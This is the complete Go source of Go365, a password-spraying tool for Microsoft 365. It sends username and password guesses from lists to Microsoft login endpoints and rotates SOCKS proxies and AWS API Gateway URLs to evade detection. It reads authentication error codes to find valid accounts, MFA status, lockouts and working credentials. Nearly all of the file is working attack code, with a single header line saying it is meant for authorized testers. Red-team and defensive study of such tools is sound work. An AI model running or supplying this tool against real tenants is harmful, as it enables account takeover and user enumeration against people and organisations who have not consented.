/*
Go365
authors: h0useh3ad, paveway3, S4R1N, EatonChips
license: MIT
Copyright 2021 Optiv Inc.
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.
*/
package main
import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
	"encoding/json"
	"github.com/beevik/etree"
	"github.com/fatih/color"
	"golang.org/x/net/proxy"
	//"crypto/tls"                     uncomment when testing through burp + proxifier
)
var (
	targetURL = ""
	targetURLrst2 = "https://login.microsoftonline.com/rst2.srf"
	targetURLgraph = "https://login.microsoft.com/common/oauth2/token"
	debug     = false
)
const (
	version = "1.4"
	tool    = "Go365"
	authors = "h0useh3ad, paveway3, S4R1N, EatonChips"
	usage   = `Usage:

  -h                            Shows this stuff

  Required - Endpoint:   

    -endpoint [rst or graph]    Specify which endpoint to use
                                : (-endpoint rst)   login.microsoftonline.com/rst2.srf. SOAP XML request with XML response
                                : (-endpoint graph)  login.microsoft.com/common/oauth2/token. HTTP POST request with JSON Response

  Required - Usernames and Passwords:

    -u <string>                 Single username to test
                                : Username with or without "@domain.com"
                                : Must also provide -d flag to specify the domain
                                : (-u legit.user)

    -ul <file>                  Username list to use (overrides -u)
                                : File should contain one username per line
                                : Usernames can have "@domain.com"
                                : If no domain is specified, the -d domain is used
                                : (-ul ./usernamelist.txt)

    -p <string>                 Password to attempt
                                : Enclose in single quotes if it contains special characters
                                : (-p password123)  or  (-p 'p@s$w0|2d')

    -pl <file>                  Password list to use (overrides -p)
                                : File should contain one password per line
                                : -delay flag can be used to include a pause between each set of attempts
                                : (-pl ./passwordlist.txt)

    -up <file>                  Userpass list to use (overrides all the above options)
                                : One username and password separated by a ":" per line
                                : Be careful of duplicate usernames!
                                : (-up ./userpasslist.txt)

  Required/Optional - Domain:

    -d <string>                 Domain to test
                                : Use this if the username or username list does not include "@targetcompany.com"
                                : (-d targetcompany.com)

  Optional:

    -w <int>                    Time to wait between attempts in seconds. 
                                : Default: 1 second. 5 seconds recommended.
                                : (-w 10)

    -delay <int>                Delay (in seconds) between sprays when using a password list.
                                : Default: 60 minutes (3600 seconds) recommended.
                                : (-delay 7200)

    -o <string>                 Output file to write to
                                : Will append if file exists, otherwise a file is created
                                : (-o ./Go365output.out)

    -proxy <string>             Single proxy server to use
                                : IP address and Port separated by a ":"
                                : Has only been tested using SSH SOCKS5 proxies
                                : (-proxy 127.0.0.1:1080)

    -proxyfile <string>         A file with a list of proxy servers to use
                                : IP address and Port separated by a ":" on each line
                                : Randomly selects a proxy server to use before each request
                                : Has only been tested using SSH SOCKS5 proxies
                                : (-proxyfile ./proxyfile.txt)

    -url <string>               Endpoint to send requests to
                                : Amazon API Gateway 'Invoke URL'
                                : Highly recommended that you use this option.
                                : (-url https://kg98agrae3.execute-api.us-east-2.amazonaws.com/login)

    -debug                      Debug mode.
                                : Print xml response

 Examples:
  ./Go365 -endpoint rst -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
  ./Go365 -endpoint rst -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
  ./Go365 -endpoint graph -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
  ./Go365 -endpoint rst -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login 
  `
	banner = `
  ██████         ██████   ██████  ██████
 ██                   ██ ██       ██     
 ██  ███   ████   █████  ███████  ██████
 ██    ██ ██  ██      ██ ██    ██      ██
  ██████   ████  ██████   ██████  ██████
`
)
// function to handle wait times
func wait(wt int) {
	waitTime := time.Duration(wt) * time.Second
	time.Sleep(waitTime)
}
// funtion to randomize the list of proxy servers
func randomProxy(proxies []string) string {
	var proxy string
	if len(proxies) > 0 {
		proxy = proxies[rand.Intn(len(proxies))]
	}
	return proxy
}
type flagVars struct {
	flagHelp              bool
	flagEndpoint          string
	flagUsername          string
	flagUsernameFile      string
	flagDomain            string
	flagPassword          string
	flagPasswordFile      string
	flagUserPassFile      string
	flagDelay             int
	flagWaitTime          int
	flagProxy             string
	flagProxyFile         string
	flagOutFilePath       string
	flagAWSGatewayURL     string
	flagDebug             bool
}
func flagOptions() *flagVars {
	flagHelp := flag.Bool("h", false, "")
	flagEndpoint := flag.String("endpoint", "rst", "")
	flagUsername := flag.String("u", "", "")
	flagUsernameFile := flag.String("ul", "", "")
	flagDomain := flag.String("d", "", "")
	flagPassword := flag.String("p", "", "")
	flagPasswordFile := flag.String("pl", "", "")
	flagUserPassFile := flag.String("up", "", "")
	flagDelay := flag.Int("delay", 3600, "")
	flagWaitTime := flag.Int("w", 1, "")
	flagProxy := flag.String("proxy", "", "")
	flagOutFilePath := flag.String("o", "", "")
	flagProxyFile := flag.String("proxyfile", "", "")
	flagAWSGatewayURL := flag.String("url", "", "")
	flagDebug := flag.Bool("debug", false, "")
	flag.Parse()
	return &flagVars{
		flagHelp:           *flagHelp,
		flagEndpoint:       *flagEndpoint,
		flagUsername:       *flagUsername,
		flagUsernameFile:   *flagUsernameFile,
		flagDomain:         *flagDomain,
		flagPassword:       *flagPassword,
		flagPasswordFile:   *flagPasswordFile,
		flagUserPassFile:   *flagUserPassFile,
		flagDelay:          *flagDelay,
		flagWaitTime:       *flagWaitTime,
		flagProxy:          *flagProxy,
		flagProxyFile:      *flagProxyFile,
		flagOutFilePath:    *flagOutFilePath,
		flagAWSGatewayURL:  *flagAWSGatewayURL,
		flagDebug:          *flagDebug,
	}
}
func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute) {
	var returnString string
	var returnColor color.Attribute
	client := &http.Client{}
	// Devs - uncomment this code if you want to proxy through burp + proxifier
	//client := &http.Client{
	//	Transport: &http.Transport{
	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
	//	},
	//}
	requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
	// If a proxy was set, do this stuff
	if prox != "" {
		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
		if err != nil {
			fmt.Println("Error connecting to proxy.")
		}
		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
		client = &http.Client{
			Transport: tr,
			Timeout:   15 * time.Second,
		}
	}
	// Build http request
	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	if err != nil {
		panic(err)
	}
	// Send http request
	response, err := client.Do(request)
	if err != nil {
		color.Set(color.FgRed)
		fmt.Println("[!] Could not connect to microsoftonline.com\n")
		fmt.Println("[!] Debug info below:")
		color.Unset()
		panic(err)
	}
	defer response.Body.Close()
	// Read response
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		print(err)
	}
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		panic(err)
	}
	jsonErrCode := data["error_codes"]
	x := fmt.Sprintf("%v", jsonErrCode)

	if strings.Contains(x, "50059") {
		fmt.Println(color.RedString("[graph] [-] Domain not found in o365 directory. Exiting..."))
		os.Exit(0) // no need to continue if the domain isn't found
	} else if strings.Contains(x, "50034") {
		returnString = "[graph] [-] User not found: " + un
		returnColor = color.FgRed
	} else if strings.Contains(x, "50126") {
		returnString = "[graph] [-] Valid user, but invalid password: " + un + " : " + pw
		returnColor = color.FgYellow
	} else if strings.Contains(x, "50055") {
		returnString = "[graph] [!] Valid user, expired password: " + un + " : " + pw
		returnColor = color.FgMagenta
	} else if strings.Contains(x, "50056") {
		returnString = "[graph] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
		returnColor = color.FgYellow
	} else if strings.Contains(x, "50053") {
		returnString = "[graph] [-] Account locked out: " + un
		returnColor = color.FgMagenta
	} else if strings.Contains(x, "50057") {
		returnString = "[graph] [-] Account disabled: " + un
		returnColor = color.FgMagenta
	} else if strings.Contains(x, "50076") || strings.Contains(x, "50079") {
		returnString = "[graph] [+] Possible valid login, MFA required. " + un + " : " + pw
		returnColor = color.FgGreen
	} else if strings.Contains(x, "53004") {
		returnString = "[graph] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
		returnColor = color.FgGreen
	} else if strings.Contains(x, "") {
		returnString = "[graph] [+] Possible valid login! " + un + " : " + pw
		returnColor = color.FgGreen
	} else {
		returnString = "[graph] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
		returnColor = color.FgMagenta
	}
	if debug {
		returnString = returnString + "\nDebug: " + string(body)
	}
	return returnString, returnColor
}
func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) {
	var returnString string
	var returnColor color.Attribute
	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + un + `</wsse:Username><wsse:Password>` + pw + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
	client := &http.Client{}
	// Devs - uncomment this code if you want to proxy through burp for troubleshooting
	//client := &http.Client{
	//	Transport: &http.Transport{
	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
	//	},
	//}
	// Build http request
	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	if err != nil {
		panic(err)
	}
	// Set proxy if enabled
	if prox != "" {
		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
		if err != nil {
			fmt.Println("Error connecting to proxy.")
		}
		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
		client = &http.Client{
			Transport: tr,
			Timeout:   15 * time.Second,
		}
	}
	// Send http request
	response, err := client.Do(request)
	if err != nil {
		color.Set(color.FgRed)
		fmt.Println("[!] Could not connect to microsoftonline.com\n")
		fmt.Println("[!] Debug info below:")
		color.Unset()
		panic(err)
	}
	defer response.Body.Close()
	// Read response
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		print(err)
	}
	// Parse response
	xmlResponse := etree.NewDocument()
	xmlResponse.ReadFromBytes(body)
	//// Read response codes
     // looks for the "psf:text" field within the XML response 
	x := xmlResponse.FindElement("//psf:text")
	if x == nil {
		returnString = color.GreenString("[rst] [+] Possible valid login! " + un + " : " + pw)
		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
	} else if strings.Contains(x.Text(), "AADSTS50059") {
		// if the domain is not in the directory then exit 
		fmt.Println(color.RedString("[rst] [-] Domain not found in o365 directory. Exiting..."))
		os.Exit(0) // no need to continue if the domain isn't found
	} else if strings.Contains(x.Text(), "AADSTS50034") {
		returnString = "[rst] [-] User not found: " + un
		returnColor = color.FgRed
	} else if strings.Contains(x.Text(), "AADSTS50126") {
		returnString = "[rst] [-] Valid user, but invalid password: " + un + " : " + pw
		returnColor = color.FgYellow
	} else if strings.Contains(x.Text(), "AADSTS50055") {
		returnString = "[rst] [!] Valid user, expired password: " + un + " : " + pw
		returnColor = color.FgMagenta
	} else if strings.Contains(x.Text(), "AADSTS50056") {
		returnString = "[rst] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
		returnColor = color.FgYellow
	} else if strings.Contains(x.Text(), "AADSTS50053") {
		returnString = "[rst] [-] Account locked out: " + un
		returnColor = color.FgMagenta
	} else if strings.Contains(x.Text(), "AADSTS50057") {
		returnString = "[rst] [-] Account disabled: " + un
		returnColor = color.FgMagenta
	} else if strings.Contains(x.Text(), "AADSTS50076") || strings.Contains(x.Text(), "AADSTS50079") {
		returnString = "[rst] [+] Possible valid login, MFA required. " + un + " : " + pw
		returnColor = color.FgGreen
	} else if strings.Contains(x.Text(), "AADSTS53004") {
		returnString = "[rst] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
		returnColor = color.FgGreen
	} else {
		returnString = "[rst] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
		returnColor = color.FgMagenta
	}
	if debug {
		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
	}
	return returnString, returnColor
}
func main() {
	fmt.Println(color.BlueString(banner))
	fmt.Println(color.RedString(" Version: ") + version)
	fmt.Println(color.RedString(" Authors: ") + authors + "\n")
	var domain string
	var proxyList []string
	var usernameList []string
	var passwordList []string
	var outFile *os.File
	var err error
	rand.Seed(time.Now().UnixNano())
	opt := flagOptions()
	//-h
	if opt.flagHelp {
		fmt.Printf("%s\n", usage)
		os.Exit(0)
	}
	// -u
	if opt.flagUsername != "" {
		usernameList = append(usernameList, opt.flagUsername)
	} else if opt.flagUsernameFile == "" && opt.flagUserPassFile == "" {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a user. E.g. -u legituser, -ul ./user_list.txt, -up ./userpass_list.txt"))
		os.Exit(0)
	}
	// -ul
	if opt.flagUsernameFile != "" {
		// Open username file
		usernameFile, err := os.Open(opt.flagUsernameFile)
		if err != nil {
			panic(err)
		}
		defer usernameFile.Close()

		// Read username file
		scanner := bufio.NewScanner(usernameFile)
		for scanner.Scan() {
			usernameList = append(usernameList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}
	}
	// -p
	if opt.flagPassword != "" {
		passwordList = append(passwordList, opt.flagPassword)
	} else if opt.flagPasswordFile == "" && opt.flagUserPassFile == "" {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a password to test. E.g. -p 'password123!', -pl ./password_list.txt, -up ./userpass_list.txt"))
		os.Exit(0)
	}
	// -pl
	if opt.flagPasswordFile != "" {
		// Open password file
		passwordFile, err := os.Open(opt.flagPasswordFile)
		if err != nil {
			panic(err)
		}
		defer passwordFile.Close()

		// Read password file
		scanner := bufio.NewScanner(passwordFile)
		for scanner.Scan() {
			passwordList = append(passwordList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}
	}
	// -up
	if opt.flagUserPassFile != "" {
		// Open userpass file
		passwordFile, err := os.Open(opt.flagUserPassFile)
		if err != nil {
			panic(err)
		}
		defer passwordFile.Close()

		// Read userpass file
		scanner := bufio.NewScanner(passwordFile)
		for scanner.Scan() {
			up := strings.Split(scanner.Text(), ":")
			if len(up) > 1 {
				usernameList = append(usernameList, up[0])
				passwordList = append(passwordList, up[1])
			}
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}
	}
	// -d
	if opt.flagDomain != "" {
		domain = fmt.Sprintf("@" + opt.flagDomain)
	} else if len(usernameList) != 1 || !strings.Contains(usernameList[0], "@") {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a domain. E.g. -d testdomain.com"))
		os.Exit(0)
	}
	// -proxy
	if opt.flagProxy != "" {
		proxyList = append(proxyList, opt.flagProxy)

		fmt.Println(color.GreenString("[!] Optional proxy configured: " + opt.flagProxy))
	}
	// -proxyfile
	if opt.flagProxyFile != "" {
		proxyFile, err := os.Open(opt.flagProxyFile)
		if err != nil {
			panic(err)
		}
		defer proxyFile.Close()

		scanner := bufio.NewScanner(proxyFile)
		for scanner.Scan() {
			proxyList = append(proxyList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}
		fmt.Println(color.GreenString("[!] Optional proxy file configured: " + opt.flagProxyFile))
	}
	// -o
	if opt.flagOutFilePath != "" {
		outFile, err = os.OpenFile(opt.flagOutFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			panic(err)
		}
		defer outFile.Close()

		outFile.WriteString(strings.Join(os.Args, " ") + "\n")
	}
	// -url
	if opt.flagAWSGatewayURL != "" {
		targetURL = opt.flagAWSGatewayURL
		resp, err := http.Get(targetURL)
		if err != nil {
			color.Set(color.FgRed)
			fmt.Println("[!] Could not connect to AWS Gateway link provided: " + targetURL + "\n")
			fmt.Println("[!] Debug info below:")
			color.Unset()
			panic(err)
		} else {
			color.Set(color.FgGreen)
			fmt.Println("[!] Optional AWS Gateway configured: " + targetURL + "\n")
			color.Unset()
			_ = resp
		}
	}
	// -endpoint
	if opt.flagEndpoint == "rst"{
		fmt.Println("Using the rst endpoint...")
		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
		targetURL = targetURLrst2
	} else if opt.flagEndpoint == "graph" {
		targetURL = targetURLgraph
		fmt.Println("using the graph endpoint...")
		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoft.com/common/oauth2/token ")
	} else {
		fmt.Println("Specify an endpoint (-endpoint rst, or -endpoint graph")
		fmt.Printf("%s\n", usage)
		os.Exit(0)
	}
	// -debug
	debug = opt.flagDebug
	//// Finally it starts happening
	// Iterate through passwords
	for i, pass := range passwordList {
		// Iterate through usernames
		for j, user := range usernameList {
			// Add domain if username doesn't already have one
			if !strings.Contains(user, "@") {
				user = user + domain
			}
			// If using userpass file, use corresponding password
			if opt.flagUserPassFile != "" {
				pass = passwordList[j]
			}
			result := ""
			// Test username:password combo
			if opt.flagEndpoint == "rst" {
				result, col := doTheStuffRst(user, pass, randomProxy(proxyList))
				// Print with color
				color.Set(col)
				fmt.Println(result)
				color.Unset()
				// Write to file
				if opt.flagOutFilePath != "" {
					outFile.WriteString(result + "\n")
				}
				// Wait between usernames
				if j < len(usernameList)-1 {
					wait(opt.flagWaitTime)
				}
			} else if opt.flagEndpoint == "graph" {
				result, col := doTheStuffGraph(user, pass, randomProxy(proxyList))
				// Print with color
				color.Set(col)
				fmt.Println(result)
				color.Unset()
				// Write to file
				if opt.flagOutFilePath != "" {
					outFile.WriteString(result + "\n")
				}	
				// Wait between usernames
				if j < len(usernameList)-1 {
					wait(opt.flagWaitTime)
				}
			}
			// Write to file
			if opt.flagOutFilePath != "" {
				outFile.WriteString(result + "\n")
			}
			// Wait between usernames
			if j < len(usernameList)-1 {
				wait(opt.flagWaitTime)
			}
		}
		// If using userpass file, exit loop
		if opt.flagUserPassFile != "" {
			break
		}
		// Wait between passwords
		if i < len(passwordList)-1 {
			wait(opt.flagDelay)
		}
	}
	// Remind user of output file
	if opt.flagOutFilePath != "" {
		fmt.Println(color.GreenString("[!] Output file located at: " + opt.flagOutFilePath))
	}
}
